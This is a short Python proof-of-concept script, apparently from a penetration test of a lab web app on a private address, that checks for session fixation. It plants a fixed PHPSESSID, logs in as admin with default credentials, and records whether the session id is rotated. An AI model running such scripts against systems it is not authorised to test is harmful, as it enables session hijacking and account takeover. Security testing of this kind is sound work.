import sys, urllib.request, urllib.parse, re

BASE = "http://10.31.0.87:3000"
SEED = "aegisfixedseed00000000000000001"

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

op = urllib.request.build_opener(NoRedirect)

# 1) Attacker plants a session id on the victim's browser pre-login (fixation scenario)
req0 = urllib.request.Request(BASE + "/login.php")
req0.add_header("Cookie", "PHPSESSID=" + SEED)
r0 = op.open(req0, timeout=20)
sc0 = r0.headers.get_all("Set-Cookie") or []
page = r0.read().decode()
tok = re.search(r"user_token' value='([0-9a-f]+)'", page).group(1)
print("seeded request; server Set-Cookie on GET login.php:", sc0)
sid_after_get = None
for c in sc0:
    if c.startswith("PHPSESSID="):
        sid_after_get = c.split(";")[0].split("=", 1)[1]
print("session id after GET:", sid_after_get)

# 2) Victim logs in while still carrying the planted id
data = urllib.parse.urlencode({"username": "admin", "password": "password", "Login": "Login", "user_token": tok}).encode()
req1 = urllib.request.Request(BASE + "/login.php", data=data, method="POST")
req1.add_header("Cookie", "PHPSESSID=" + (sid_after_get or SEED))
try:
    r1 = op.open(req1, timeout=15)
except urllib.error.HTTPError as exc_obj:
    hdrs = exc_obj.headers
    loc = hdrs.get("Location")
    sc1 = hdrs.get_all("Set-Cookie") or []
    sid_after_login = None
    for c in sc1:
        if c.startswith("PHPSESSID="):
            sid_after_login = c.split(";")[0].split("=", 1)[1]
    print("login POST ->", loc)
    print("Set-Cookie after login:", sc1)
    print("session id after login:", sid_after_login)
    planted = sid_after_get or SEED
    verdict = "ROTATED (fixation NOT exploitable)" if sid_after_login != planted else "KEPT (fixation EXPLOITABLE)"
    print("planted seed was:", planted)
    print("VERDICT:", verdict)
    with open("evidence/auth/session-fixation.txt", "w") as fh:
        fh.write("seed=%s\nafter_get=%s\nafter_login=%s\nverdict=%s\n" % (SEED, planted, sid_after_login, verdict))
